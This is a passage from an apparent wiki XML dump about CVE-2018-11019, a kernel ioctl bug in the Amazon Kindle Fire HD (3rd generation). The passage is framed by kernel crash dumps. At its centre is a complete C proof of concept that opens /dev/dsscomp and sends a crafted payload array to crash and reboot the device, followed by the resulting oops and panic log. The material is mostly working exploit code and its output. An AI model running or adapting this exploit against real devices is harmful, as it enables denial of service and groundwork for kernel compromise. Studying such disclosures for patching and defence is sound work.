[  165.437316] 5ad0  00010105 01010005 01040901 00040001 ffff0101 00000000 00000000 00040b03
[  165.447875] 5af0  01040101 ffff0100 00000000 00000000 0000ffff 00000000 0e0c0000 01010005
[  165.458526] 5b10  01000105 0000ffff 00000000 0e0c0000 01010005 00000105 01040901 00040001
[  165.469207] 5b30  ffff0101 00000000 00000000 00040b03 01040101 3f3f0100 00010001 01000001
[  165.479736] 5b50  00000000 00000000 00000001 c0a25b5c c0a25b5c c0a25b64 c0a25b64 00000000
[  165.490417] 5b70  00000000 00000001 c0a25b78 c0a25b78 c0a25b80 c0a25b80 00000000 00000000
[  165.500946] 5b90  00000000 c0a25b94 c0a25b94 c0a25b9c c0a25b9c 00000000 00000000 00000001
[  165.511627] 5bb0  c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0 c0a25bc0 c0a25bc8 c0a25bc8
[  165.522186] 
[  165.522186] R9: 0xd8c0ac28:
[  165.527282] ac28  d8c0ac28 d8c0ac28 00000000 00000000 00000000 c06bc674 000200da c09dda58
[  165.537841] ac48  00000000 00000000 d8c0ac50 d8c0ac50 00000000 c0aa5174 c0aa5174 c0aa5148
[  165.548492] ac68  5aefbbda 00000000 00000000 00000000 d8c0ac80 00000000 00000000 00000000
[  165.559020] ac88  00200000 00000000 00000000 d8c0ac94 d8c0ac94 dd3f6080 dd3f6080 00000000
[  165.569702] aca8  000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400
[  165.580261] acc8  d8c0ad80 dd3ede70 00001064 00000001 0fb00000 5aefbbda 2e19b832 5aefbbda
[  165.590911] ace8  2e19b832 5aefbbda 2e19b832 00000000 00000000 00000000 00000000 00000000
[  165.601593] ad08  00000000 00000000 00000000 00000000 00000001 00000000 00000000 d8c0ad24
[  165.612121] Process gcioctl_poc (pid: 3932, stack limit = 0xc25a02f8)
[  165.619445] Stack: (0xc25a1e70 to 0xc25a2000)
[  165.624359] 1e60:                                     00000001 00000028 000fffff c25a1ea0
[  165.633605] 1e80: c25a1edc c25a1e90 c0207454 c00bd920 0000001e c2db9600 c25a1ed4 c25a1ea8
[  165.642822] 1ea0: ffffffff 0000000f 00000000 ffffffff 00000002 00000001 00000000 c25a1f14
[  165.652038] 1ec0: 00000000 00000001 d8c0aca8 d70c5580 c25a1efc c25a1ee0 c02089fc 00000000
[  165.661102] 1ee0: c719ab40 00000004 c719ab40 bed5c610 d8c0aca8 00000000 c25a1f74 c25a1f08
[  165.670318] 1f00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190
[  165.679565] 1f20: dcf8c440 c25a1f0c c25a0000 bed5c638 bed5c610 c0085d9e c719ab40 00000004
[  165.688781] 1f40: c25a0000 00000000 c25a1f64 00000000 bed5c610 c0085d9e c719ab40 00000004
[  165.697875] 1f60: c25a0000 00000000 c25a1fa4 c25a1f78 c01365e0 c0135fc4 00000000 00000000
[  165.707092] 1f80: 00000400 bed5c638 00010e64 00000000 00000036 c0013e08 00000000 c25a1fa8
[  165.716308] 1fa0: c0013c60 c0136578 bed5c638 00010e64 00000004 c0085d9e bed5c610 bed5c610
[  165.725402] 1fc0: bed5c638 00010e64 00000000 00000036 00000000 00000000 00000000 bed5c624
[  165.734619] 1fe0: 00000000 bed5c5f4 000106a4 0002918c 60000010 00000004 00000000 00000000
[  165.743835] Backtrace: 
[  165.746856] [&lt;c031743c&gt;] (dev_ioctl+0x0/0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c/0x5b4)
[  165.756256] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0/0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74/0x84)
[  165.765502] [&lt;c013656c&gt;] (sys_ioctl+0x0/0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0/0x30)
[  165.774780]  r8:c0013e08 r7:00000036 r6:00000000 r5:00010e64 r4:bed5c638
[  165.783203] Code: e2870038 ebf55c25 e3500000 1a0002e0 (e5943028) 
[  165.793060] Board Information: 
[  165.793060]  Revision : 0001
[  165.793060]  Serial    : 0000000000000000
[  165.793090] SoC Information:
[  165.793090]  CPU    : OMAP4470
[  165.793090]  Rev    : ES1.0
[  165.793121]  Type    : HS
[  165.793121]  Production ID: 0002B975-000000CC
[  165.793121]  Die ID    : 1CC60000-50002FFF-0B00935D-11007004
[  165.793121] 
[  165.844757] ---[ end trace aba846a2af6e75b7 ]---
[  165.850097] Kernel panic - not syncing: Fatal exception
[  165.856109] CPU0: stopping
[  165.859252] Backtrace: 
[  165.862274] [&lt;c0018148&gt;] (dump_backtrace+0x0/0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18/0x1c)
[  165.871643]  r6:c09ddc50 r5:c09dc844 r4:00000000 r3:c0a0e950
[  165.878784] [&lt;c0698ba0&gt;] (dump_stack+0x0/0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190/0x1c4)
[  165.887908] [&lt;c0019a48&gt;] (handle_IPI+0x0/0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58/0x60)
[  165.897399] [&lt;c00084a4&gt;] (gic_handle_irq+0x0/0x60) from [&lt;c06a5380&gt;] (__irq_svc+0x40/0x70)
[  165.906707] Exception stack(0xd8dcfc38 to 0xd8dcfc80)
[  165.912384] fc20:                                                       c153a9f8 00000000
[  165.921600] fc40: 00000002 c153aa08 00000007 c153a9f8 d8d72210 b6eaf010 d8caee34 bab7375f
[  165.930816] fc60: 00000001 d8dcfcac 0009eded d8dcfc80 c010a5b4 c010a5fc 20070013 ffffffff
[  165.940032]  r6:ffffffff r5:20070013 r4:c010a5fc r3:c010a5b4
[  165.947052] [&lt;c010a534&gt;] (follow_page+0x0/0x238) from [&lt;c010af94&gt;] (__get_user_pages+0x13c/0x3f0)
[  165.957031] [&lt;c010ae58&gt;] (__get_user_pages+0x0/0x3f0) from [&lt;c010b350&gt;] (get_user_pages+0x50/0x58)
[  165.967102] [&lt;c010b300&gt;] (get_user_pages+0x0/0x58) from [&lt;c00ff544&gt;] (get_user_pages_fast+0x64/0x7c)
[  165.977233]  r4:d8caee3c
[  165.980468] [&lt;c00ff4e0&gt;] (get_user_pages_fast+0x0/0x7c) from [&lt;c01eeff0&gt;] (fuse_copy_fill+0x1bc/0x238)
[  165.990905] [&lt;c01eee34&gt;] (fuse_copy_fill+0x0/0x238) from [&lt;c01ef0a4&gt;] (fuse_copy_one+0x38/0x68)
[  166.000579]  r6:d8dcdb00 r5:d8dce000 r4:d8dcfe24 r3:00000000
[  166.007690] [&lt;c01ef06c&gt;] (fuse_copy_one+0x0/0x68) from [&lt;c01efe64&gt;] (fuse_dev_do_read+0x3e4/0x69c)
[  166.017761]  r4:dd243c00
[  166.020874] [&lt;c01efa80&gt;] (fuse_dev_do_read+0x0/0x69c) from [&lt;c01f03c0&gt;] (fuse_dev_read+0x84/0x9c)
[  166.030853] [&lt;c01f033c&gt;] (fuse_dev_read+0x0/0x9c) from [&lt;c0124ecc&gt;] (do_sync_read+0xb0/0xf0)
[  166.040222]  r7:00000000 r6:00000000 r5:00000000 r4:00000000
[  166.047363] [&lt;c0124e1c&gt;] (do_sync_read+0x0/0xf0) from [&lt;c01258f4&gt;] (vfs_read+0xa4/0x148)
[  166.056488] [&lt;c0125850&gt;] (vfs_read+0x0/0x148) from [&lt;c01259d8&gt;] (sys_read+0x40/0x78)
[  166.065093]  r8:00040050 r7:b6eaf010 r6:d8e08900 r5:00000000 r4:00000000
[  166.073547] [&lt;c0125998&gt;] (sys_read+0x0/0x78) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0/0x30)
[  166.082855]  r8:c0013e08 r7:00000003 r6:b6eaf008 r5:b73828a0 r4:b6eaf010
[  166.091217] CPU0 PC (0) : 0xc0019b2c
[  166.095397] CPU0 PC (1) : 0xc0019b2c
[  166.099456] CPU0 PC (2) : 0xc0019b2c
[  166.103515] CPU0 PC (3) : 0xc0019b2c
[  166.107574] CPU0 PC (4) : 0xc0019b2c
[  166.111785] CPU0 PC (5) : 0xc0019b2c
[  166.115814] CPU0 PC (6) : 0xc0019b2c
[  166.119873] CPU0 PC (7) : 0xc0019b2c
[  166.124084] CPU0 PC (8) : 0xc0019b2c
[  166.128112] CPU0 PC (9) : 0xc0019b2c
[  166.132171] CPU1 PC (0) : 0xc003ee38
[  166.136352] CPU1 PC (1) : 0xc003ee54
[  166.140411] CPU1 PC (2) : 0xc003ee54
[  166.144470] CPU1 PC (3) : 0xc003ee54
[  166.148681] CPU1 PC (4) : 0xc003ee54
[  166.152709] CPU1 PC (5) : 0xc003ee54
[  166.156768] CPU1 PC (6) : 0xc003ee54
[  166.160980] CPU1 PC (7) : 0xc003ee54
[  166.165008] CPU1 PC (8) : 0xc003ee54
[  166.169067] CPU1 PC (9) : 0xc003ee54
[  166.173126] 
[  166.175048] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017
[  166.175079
&lt;/pre&gt;</text>
      <sha1>kxam3u58jihjv3hxun1xgeizottyczj</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2018-11019 Amazon Kindle Fire HD (3rd) Fire OS kernel組件安全漏洞/zh-cn</title>
    <ns>0</ns>
    <id>6160</id>
    <revision>
      <id>7045</id>
      <timestamp>2021-07-12T07:09:57Z</timestamp>
      <contributor>
        <username>Xc1ym</username>
        <id>256</id>
      </contributor>
      <comment>Created page with "CVE-2018-11019 Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞"</comment>
      <origin>7045</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="16915" sha1="f4w1rmfbmm1ze8ieqmq9hb8j5abi5b0" xml:space="preserve">&lt;languages  /&gt;
==漏洞影响==
&lt;pre&gt;
Fire OS 4.5.5.3
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/*
 * This is poc of Kindle Fire HD 3rd
 * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517.
 * Related buggy struct name is dsscomp_setup_dispc_data.
 * This Poc should run with permission to do ioctl on /dev/dsscomp.
 *
 * The fowllwing is kmsg of kernel crash infomation:
 *
 *
 */
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/dsscomp";
static command = 1118064517; 

int main(int argc, char **argv, char **env) {
    unsigned int payload[] = {
    0xffffffff,
    0x00000003,
    0x5d200040,
    0x79900008,
    0x8f5928bd,
    0x78b02422,
    0x00000000,
    0xffffffff,
    0xf4c50400,
    0x007fffff,
    0x8499f562,
    0xffff0400,
    0x001b131d,
    0x60818210,
    0x00000007,
    0xffffffff,
    0x00000000,
    0x9da9041c,
    0xcd980400,
    0x001f03f4,
    0x00000007,
    0x2a34003f,
    0x7c80d8f3,
    0x63102627,
    0xc73643a8,
    0xa28f0665,
    0x00000000,
    0x689e57b4,
    0x01ff0008,
    0x5e7324b1,
    0xae3b003f,
    0x0b174d86,
    0x00000400,
    0x21ffff37,
    0xceb367a4,
    0x00000040,
    0x00000001,
    0xec000f9e,
    0x00000001,
    0x000001ff,
    0x00000000,
    0x00000000,
    0x0000000f,
    0x0425c069,
    0x038cc3be,
    0x0000000f,
    0x00000080,
    0xe5790100,
    0x5b1bffff,
    0x0000d355,
    0x0000c685,
    0xa0070000,
    0x0010ffff,
    0x00a0ff00,
    0x00000001,
    0xff490700,
    0x0832ad03,
    0x00000006,
    0x00000002,
    0x00000001,
    0x81f871c0,
    0x738019cb,
    0xbf47ffff,
    0x00000040,
    0x00000001,
    0x7f190f33,
    0x00000001,
    0x8295769b,
    0x0000003f,
    0x869f2295,
    0xffffffff,
    0xd673914f,
    0x05055800,
    0xed69b7d5,
    0x00000000,
    0x0107ebbd,
    0xd214af8d,
    0xffff4a93,
    0x26450008,
    0x58df0000,
    0xd16db084,
    0x03ff30dd,
    0x00000001,
    0x209aff3b,
    0xe7850800,
    0x00000002,
    0x30da815c,
    0x426f5105,
    0x0de109d7,
    0x2c1a65fc,
    0xfcb3d75f,
    0x00000000,
    0x00000001,
    0x8066be5b,
    0x00000002,
    0xffffffff,
    0x5cf232ec,
    0x680d1469,
    0x00000001,
    0x00000020,
    0xffffffff,
    0x00000400,
    0xd1d12be8,
    0x02010200,
    0x01ffc16f,
    0xf6e237e6,
    0x007f0000,
    0x01ff08f8,
    0x000f00f9,
    0xbad07695,
    0x00000000,
    0xbaff0000,
    0x24040040,
    0x00000006,
    0x00000004,
    0x00000000,
    0xbc2e9242,
    0x009f5f08,
    0x00800000,
    0x00000000,
    0x00000001,
    0xff8800ff,
    0x00000001,
    0x00000000,
    0x000003f4,
    0x6faa8472,
    0x00000400,
    0xec857dd5,
    0x00000000,
    0x00000040,
    0xffffffff,
    0x3f004874,
    0x0000b77a,
    0xec9acb95,
    0xfacc0001,
    0xffff0001,
    0x0080ffff,
    0x3600ff03,
    0x00000001,
    0x8fff7d7f,
    0x6b87075a,
    0x00000000,
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141,
    0x001001ff,
    0x00000000,
    0x00000001,
    0xff1f0512,
    0x00000001,
    0x51e32167,
    0xc18c55cc,
    0x00000000,
    0xffffffff,
    0xb4aaf12b,
    0x86edfdbd,
    0x00000010,
    0x0000003f,
    0xabff7b00,
    0xffff9ea3,
    0xb28e0040,
    0x000fffff,
    0x458603f4,
    0xffff007f,
    0xa9030f02,
    0x00000001,
    0x002cffff,
    0x9e00cdff,
    0x00000004,
    0x41414141,
    0x41414141,
    0x41414141,
    0x41414141 };

        int fd = 0;
        fd = open(driver, O_RDWR);
        if (fd &lt; 0) {
            printf("Failed to open %s, with errno %d\n", driver, errno);
            system("echo 1 &gt; /data/local/tmp/log");
            return -1;
        }

        printf("Try open %s with command 0x%x.\n", driver, command);
        printf("System will crash and reboot.\n");
        if(ioctl(fd, command, &amp;payload) &lt; 0) {
            printf("Allocation of structs failed, %d\n", errno);
            system("echo 2 &gt; /data/local/tmp/log");
            return -1;
        }
        close(fd);
        return 0;
}
崩溃日志
[  164.793151] Unable to handle kernel NULL pointer dereference at virtual address 00000037
[  164.802459] pgd = c26ec000
[  164.805664] [00000037] *pgd=82f42831, *pte=00000000, *ppte=00000000
[  164.813415] Internal error: Oops: 17 [#1] PREEMPT SMP ARM
[  164.819458] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)
[  164.827239] CPU: 1    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)
[  164.834686] PC is at dev_ioctl+0x4ac/0x10c4
[  164.839416] LR is at down_timeout+0x40/0x5c
[  164.844146] pc : [&lt;c03178e8&gt;]    lr : [&lt;c006e9b8&gt;]    psr: 60000013
[  164.844146] sp : c25a1e70  ip : c25a1e50  fp : c25a1f04
[  164.857116] r10: 00000000  r9 : d8c0aca8  r8 : bed5c610
[  164.863128] r7 : c0a25b50  r6 : c25a0000  r5 : bed5c610  r4 : 0000000f
[  164.870391] r3 : 00001403  r2 : 00000000  r1 : 20000013  r0 : 00000000
[  164.877807] Flags: nZCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user
[  164.885894] Control: 10c5387d  Table: 826ec04a  DAC: 00000015
[  164.892303] 
[  164.892333] PC: 0xc0317868:
[  164.897308] 7868  30d22003 33a03000 e3530000 0a0001c5 e3e0500d eaffff02 e1a0200d e3c26d7f
[  164.907989] 7888  e3c6603f e5963008 e2952008 30d22003 33a03000 e3530000 1a000021 e24b3064
[  164.918670] 78a8  e1a01005 e3a02008 e50b3088 e1a00003 ebfcfa5f e3500000 1a00001e e51b4060
[  164.929351] 78c8  e3020710 e59f7bdc ebf4db32 e1a01000 e2870038 ebf55c25 e3500000 1a0002e0
[  164.939880] 78e8  e5943028 e1a08000 e5940024 e1a02007 e2841024 e5803004 e5830000 e5b23070
[  164.950561] 7908  e5871070 e2420038 e5831004 e5843024 e5842028 ebf55bb9 e50b8060 e50b8064
[  164.961212] 7928  ea000006 e24b1064 e50b1088 e51b0088 e3a01008 ebfd0387 e3a03004 e50b3064
[  164.971771] 7948  e5963008 e2952008 30d22003 33a03000 e3530000 1affffc5 e1a00005 e51b1088
[  164.982299] 
[  164.982330] LR: 0xc006e938:
[  164.987426] e938  e1a01000 0a000007 e3a05000 e2433001 e5843008 e1a00004 eb18d7ad e1a00005
[  164.997955] e958  e24bd014 e89da830 e1a00004 e50b1018 eb18d135 e51b1018 e1a05000 eafffff4
[  165.008636] e978  e1a0c00d e92dd878 e24cb004 e1a04000 e1a05001 eb18d91b e5943008 e3530000
[  165.019317] e998  e1a06000 0a000007 e3a05000 e2433001 e5843008 e1a00004 e1a01006 eb18d794
[  165.029846] e9b8  e1a00005 e89da878 e1a01005 e1a00004 eb18d158 e1a05000 eafffff5 e1a0c00d
[  165.040374] e9d8  e92dd800 e24cb004 e5903000 e1a0c000 e3530000 0a00000b e5910008 e5932008
[  165.051055] e9f8  e1500002 da000003 ea000006 e5932008 e1520000 ba000003 e283c004 e5933004
[  165.061737] ea18  e3530000 1afffff8 e5813004 f57ff05f e3a00000 e58c1000 e89da800 e1a0c00d
[  165.072265] 
[  165.072265] SP: 0xc25a1df0:
[  165.077362] 1df0  00000001 00000004 d454d000 0000001d c25a1e3c c03178e8 60000013 ffffffff
[  165.087890] 1e10  c25a1e5c bed5c610 c25a1f04 c25a1e28 c06a5318 c0008370 00000000 20000013
[  165.098419] 1e30  00000000 00001403 0000000f bed5c610 c25a0000 c0a25b50 bed5c610 d8c0aca8
[  165.109100] 1e50  00000000 c25a1f04 c25a1e50 c25a1e70 c006e9b8 c03178e8 60000013 ffffffff
[  165.119781] 1e70  00000001 00000028 000fffff c25a1ea0 c25a1edc c25a1e90 c0207454 c00bd920
[  165.130340] 1e90  0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff 0000000f 00000000 ffffffff
[  165.141021] 1eb0  00000002 00000001 00000000 c25a1f14 00000000 00000001 d8c0aca8 d70c5580
[  165.151702] 1ed0  c25a1efc c25a1ee0 c02089fc 00000000 c719ab40 00000004 c719ab40 bed5c610
[  165.162353] 
[  165.162384] IP: 0xc25a1dd0:
[  165.167327] 1dd0  c0070df8 c00795ac c25a0000 00000001 00000004 d454d0f4 60000013 00000001
[  165.178009] 1df0  00000001 00000004 d454d000 0000001d c25a1e3c c03178e8 60000013 ffffffff
[  165.188537] 1e10  c25a1e5c bed5c610 c25a1f04 c25a1e28 c06a5318 c0008370 00000000 20000013
[  165.199249] 1e30  00000000 00001403 0000000f bed5c610 c25a0000 c0a25b50 bed5c610 d8c0aca8
[  165.209899] 1e50  00000000 c25a1f04 c25a1e50 c25a1e70 c006e9b8 c03178e8 60000013 ffffffff
[  165.220581] 1e70  00000001 00000028 000fffff c25a1ea0 c25a1edc c25a1e90 c0207454 c00bd920
[  165.231109] 1e90  0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff 0000000f 00000000 ffffffff
[  165.241790] 1eb0  00000002 00000001 00000000 c25a1f14 00000000 00000001 d8c0aca8 d70c5580
[  165.252441] 
[  165.252441] FP: 0xc25a1e84:
[  165.257415] 1e84  c25a1e90 c0207454 c00bd920 0000001e c2db9600 c25a1ed4 c25a1ea8 ffffffff
[  165.268066] 1ea4  0000000f 00000000 ffffffff 00000002 00000001 00000000 c25a1f14 00000000
[  165.278717] 1ec4  00000001 d8c0aca8 d70c5580 c25a1efc c25a1ee0 c02089fc 00000000 c719ab40
[  165.289276] 1ee4  00000004 c719ab40 bed5c610 d8c0aca8 00000000 c25a1f74 c25a1f08 c0136044
[  165.299926] 1f04  c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440
[  165.310607] 1f24  c25a1f0c c25a0000 bed5c638 bed5c610 c0085d9e c719ab40 00000004 c25a0000
[  165.321136] 1f44  00000000 c25a1f64 00000000 bed5c610 c0085d9e c719ab40 00000004 c25a0000
[  165.331695] 1f64  00000000 c25a1fa4 c25a1f78 c01365e0 c0135fc4 00000000 00000000 00000400
[  165.342346] 
[  165.342376] R6: 0xc259ff80:
[  165.347320] ff80  00000093 00000093 0000008d 00000002 00000000 00000000 00000000 00000000
[  165.358001] ffa0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
[  165.368682] ffc0  00000093 00000093 0000008d 00000002 00000000 00000000 00000000 00000000
[  165.379241] ffe0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000
[  165.389770] 0000  00000000 00000002 00000000 d72b0980 c0a0e840 00000001 00000015 c265dc00
[  165.400451] 0020  00000000 c25a0000 c09ddc50 d72b0980 de949300 c1620b40 c25a1b7c c25a1ac8
[  165.411132] 0040  c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000
[  165.421661] 0060  005634c0 5ebcc27f 00000000 00000000 00000000 00000000 00000000 00000000
[  165.432342] 
[  165.432342] R7: 0xc0a25ad0:
[  165.437316] 5ad0  00010105 01010005 01040901 00040001 ffff0101 00000000 00000000 00040b03
[  165.447875] 5af0  01040101 ffff0100 00000000 00000000 0000ffff 00000000 0e0c0000 01010005
[  165.458526] 5b10  01000105 0000ffff 00000000 0e0c0000 01010005 00000105 01040901 00040001
[  165.469207] 5b30  ffff0101 00000000 00000000 00040b03 01040101 3f3f0100 00010001 01000001
[  165.479736] 5b50  00000000 00000000 00000001 c0a25b5c c0a25b5c c0a25b64 c0a25b64 00000000
[  165.490417] 5b70  00000000 00000001 c0a25b78 c0a25b78 c0a25b80 c0a25b80 00000000 00000000
[  165.500946] 5b90  00000000 c0a25b94 c0a25b94 c0a25b9c c0a25b9c 00000000 00000000 00000001
[  165.511627] 5bb0  c0a25bb0 c0a25bb0 c0a25bb8 c0a25bb8 c0a25bc0 c0a25bc0 c0a25bc8 c0a25bc8
[  165.522186] 
[  165.522186] R9: 0xd8c0ac28:
[  165.527282] ac28  d8c0ac28 d8c0ac28 00000000 00000000 00000000 c06bc674 000200da c09dda58
[  165.537841] ac48  00000000 00000000 d8c0ac50 d8c0ac50 00000000 c0aa5174 c0aa5174 c0aa5148
[  165.548492] ac68  5aefbbda 00000000 00000000 00000000 d8c0ac80 00000000 00000000 00000000
[  165.559020] ac88  00200000 00000000 00000000 d8c0ac94 d8c0ac94 dd3f6080 dd3f6080 00000000
[  165.569702] aca8  000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400
[  165.580261] acc8  d8c0ad80 dd3ede70 00001064 00000001 0fb00000 5aefbbda 2e19b832 5aefbbda
[  165.590911] ace8  2e19b832 5aefbbda 2e19b832 00000000 00000000 00000000 00000000 00000000
[  165.601593] ad08  00000000 00000000 00000000 00000000 00000001 00000000 00000000 d8c0ad24
[  165.612121] Process gcioctl_poc (pid: 3932, stack limit = 0xc25a02f8)
[  165.619445] Stack: (0xc25a1e70 to 0xc25a2000)
[  165.624359] 1e60:                                     00000001 00000028 000fffff c25a1ea0
[  165.633605] 1e80: c25a1edc c25a1e90 c0207454 c00bd920 0000001e c2db9600 c25a1ed4 c25a1ea8
[  165.642822] 1ea0: ffffffff 0000000f 00000000 ffffffff 00000002 00000001 00000000 c25a1f14
[  165.652038] 1ec0: 00000000 00000001 d8c0aca8 d70c5580 c25a1efc c25a1ee0 c02089fc 00000000
[  165.661102] 1ee0: c719ab40 00000004 c719ab40 bed5c610 d8c0aca8 00000000 c25a1f74 c25a1f08
[  165.670318] 1f00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190
[  165.679565] 1f20: dcf8c440 c25a1f0c c25a0000 bed5c638 bed5c610 c0085d9e c719ab40 00000004
[  165.688781] 1f40: c25a0000 00000000 c25a1f64 00000000 bed5c610 c0085d9e c719ab40 00000004
[  165.697875] 1f60: c25a0000 00000000 c25a1fa4 c25a1f78 c01365e0 c0135fc4 00000000 00000000
[  165.707092] 1f80: 00000400 bed5c638 00010e64 00000000 00000036 c0013e08 00000000 c25a1fa8
[  165.716308] 1fa0: c0013c60 c0136578 bed5c638 00010e64 00000004 c0085d9e bed5c610 bed5c610
[  165.725402] 1fc0: bed5c638 00010e64 00000000 00000036 00000000 00000000 00000000 bed5c624
[  165.734619] 1fe0: 00000000 bed5c5f4 000106a4 0002918c 60000010 00000004 00000000 00000000
[  165.743835] Backtrace: 
[  165.746856] [&lt;c031743c&gt;] (dev_ioctl+0x0/0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c/0x5b4)
[  165.756256] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0/0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74/0x84)
[  165.765502] [&lt;c013656c&gt;] (sys_ioctl+0x0/0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0/0x30)
[  165.774780]  r8:c0013e08 r7:00000036 r6:00000000 r5:00010e64 r4:bed5c638
[  165.783203] Code: e2870038 ebf55c25 e3500000 1a0002e0 (e5943028) 
[  165.793060] Board Information: 
[  165.793060]  Revision : 0001
[  165.793060]  Serial    : 0000000000000000
[  165.793090] SoC Information:
[  165.793090]  CPU    : OMAP4470
[  165.793090]  Rev    : ES1.0
[  165.793121]  Type    : HS
[  165.793121]  Production ID: 0002B975-000000CC
[  165.793121]  Die ID    : 1CC60000-50002FFF-0B00935D-11007004
[  165.793121] 
[  165.844757] ---[ end trace aba846a2af6e75b7 ]---
[  165.850097] Kernel panic - not syncing: Fatal exception
[  165.856109] CPU0: stopping
[  165.859252] Backtrace: 
[  165.862274] [&lt;c0018148&gt;] (dump_backtrace+0x0/0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18/0x1c)
[  165.871643]  r6:c09ddc50 r5:c09dc844 r4:00000000 r3:c0a0e950
[  165.878784] [&lt;c0698ba0&gt;] (dump_stack+0x0/0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190/0x1c4)
[  165.887908] [&lt;c0019a48&gt;] (handle_IPI+0x0/0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58/0x60)
[  165.897399] [&lt;c00084a4&gt;] (gic_handle_irq+0x0/0x60) from [&lt;c06a5380&gt;] (__irq_svc+0x40/0x70)
[  165.906707] Exception stack(0xd8dcfc38 to 0xd8dcfc80)
[  165.912384] fc20:                                                       c153a9f8 00000000
[  165.921600] fc40: 00000002 c153aa08 00000007 c153a9f8 d8d72210 b6eaf010 d8caee34 bab7375f
[  165.930816] fc60: 00000001 d8dcfcac 0009eded d8dcfc80 c010a5b4 c010a5fc 20070013 ffffffff
[  165.940032]  r6:ffffffff r5:20070013 r4:c010a5fc r3:c010a5b4
[  165.947052] [&lt;c010a534&gt;] (follow_page+0x0/0x238) from [&lt;c010af94&gt;] (__get_user_pages+0x13c/0x3f0)
[  165.957031] [&lt;c010ae58&gt;] (__get_user_pages+0x0/0x3f0) from [&lt;c010b350&gt;] (get_user_pages+0x50/0x58)
[  165.967102] [&lt;c010b300&gt;] (get_user_pages+0x0/0x58) from [&lt;c00ff544&gt;] (get_user_pages_fast+0x64/0x7c)
[  165.977233]  r4:d8caee3c
[  165.980468] [&lt;c00ff4e0&gt;] (get_user_pages_fast+0x0/0x7c) from [&lt;c01eeff0&gt;] (fuse_copy_fill+0x1bc/0x238)
[  165.990905] [&lt;c01eee34&gt;] (fuse_copy_fill+0x0/0x238) from [&lt;c01ef0a4&gt;] (fuse_copy_one+0x38/0x68)
[  166.000579]  r6:d8dcdb00 r5:d8dce000 r4:d8dcfe24 r3:00000000
[  166.007690] [&lt;c01ef06c&gt;] (fuse_copy_one+0x0/0x68) from [&lt;c01efe64&gt;] (fuse_dev_do_read+0x3e4/0x69c)
[  166.017761]  r4:dd243c00
[  166.020874] [&lt;c01efa80&gt;] (fuse_dev_do_read+0x0/0x69c) from [&lt;c01f03c0&gt;] (fuse_dev_read+0x84/0x9c)
[  166.030853] [&lt;c01f033c&gt;] (fuse_dev_read+0x0/0x9c) from [&lt;c0124ecc&gt;] (do_sync_read+0xb0/0xf0)
[  166.040222]  r7:00000000 r6:00000000 r5:00000000 r4:00000000
[  166.047363] [&lt;c0124e1c&gt;] (do_sync_read+0x0/0xf0) from [&lt;c01258f4&gt;] (vfs_read+0xa4/0x148)
[  166.056488] [&lt;c0125850&gt;] (vfs_read+0x0/0x148) from [&lt;c01259d8&gt;] (sys_read+0x40/0x78)
[  166.065093]  r8:00040050 r7:b6eaf010 r6:d8e08900 r5:00000000 r4:00000000
[  166.073547] [&lt;c0125998&gt;] (sys_read+0x0/0x78) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0/0x30)
[  166.082855]  r8:c0013e08 r7:00000003 r6:b6eaf008 r5:b73828a0 r4:b6eaf010
[  166.091217] CPU0 PC (0) : 0xc0019b2c
[  166.095397] CPU0 PC (1) : 0xc0019b2c
[  166.099456] CPU0 PC (2) : 0xc0019b2c
[  166.103515] CPU0 PC (3) : 0xc0019b2c
[  166.107574] CPU0 PC (4) : 0xc0019b2c
[  166.111785] CPU0 PC (5) : 0xc0019b2c
[  166.115814] CPU0 PC (6) : 0xc0019b2c
[  166.119873] CPU0 PC (7) : 0xc0019b2c
[  166.124084] CPU0 PC (8) : 0xc0019b2c
[  166.128112] CPU0 PC (9) : 0xc0019b2c
[  166.132171] CPU1 PC (0) : 0xc003ee38
[  166.136352] CPU1 PC (1) : 0xc003ee54
[  166.140411] CPU1 PC (2) : 0xc003ee54
[  166.144470] CPU1 PC (3) : 0xc003ee54
[  166.148681] CPU1 PC (4) : 0xc003ee54
[  166.152709] CPU1 PC (5) : 0xc003ee54
[  166.156768] CPU1 PC (6) : 0xc003ee54
[  166.160980] CPU1 PC (7) : 0xc003ee54
[  166.165008] CPU1 PC (8) : 0xc003ee54
